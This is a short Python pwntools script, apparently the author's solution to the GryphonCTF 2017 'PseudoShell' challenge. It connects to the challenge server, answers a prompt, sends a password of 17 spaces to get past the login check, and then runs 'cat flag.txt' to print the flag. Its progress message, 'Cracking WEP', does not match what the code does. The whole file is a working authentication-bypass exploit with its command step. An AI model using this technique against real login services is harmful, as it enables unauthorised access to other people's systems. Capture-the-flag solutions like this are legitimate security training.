#! /usr/bin/env python3
##
# Created for GryphonCTF 2017_PseudoShell
# By Amos (LFlare) Ng <amosng1@gmail.com>
##
# Imports
from pwn import *

# Logging
with log.progress("Cracking WEP...") as p:
    # Connect to socket
    t = remote("pwn2.chal.gryphonctf.com", 17341)

    # Send payload and dump initial output
    t.recvuntil("(yes/no)? ")
    t.sendline("yes")
    t.recvuntil("password: ")
    t.sendline("\x20" * 17)

    # Get flag
    t.sendline("cat flag.txt")
    t.recvline()
    flag = t.recvline().decode()
    p.success(flag)
